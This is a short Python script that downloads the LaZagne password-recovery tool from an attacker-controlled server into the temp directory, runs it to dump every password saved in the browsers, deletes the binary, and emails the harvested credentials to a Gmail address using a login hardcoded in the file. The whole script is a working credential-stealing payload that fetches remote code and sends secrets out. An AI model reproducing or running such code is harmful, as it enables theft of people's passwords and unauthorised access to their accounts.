#!/usr/bin/env python
import requests,subprocess,smtplib,os,tempfile

def get_file(url): #this function gets the file we want from my web server
    downloaded_file = requests.get(url)
    filename= url.split("/")[-1]
    with open(filename,"wb") as outfile:
        outfile.write(downloaded_file.content)

def sending_email(mymail,password,massege): #this function sends an email to the desired email address
    server=smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(mymail,password)
    server.sendmail(mymail,mymail,massege)
    server.quit()

temp_directory=tempfile.gettempdir()
os.chdir(temp_directory)

get_file("http://192.168.194.145/Myfiles/lazagne.exe")

command ='lazagne.exe browsers' #command that shows all the saved passwords
result=subprocess.check_output(command,shell=True)

os.remove('lazagne.exe')

sending_email("testing201133@gmail.com","testingtesting201133",result)
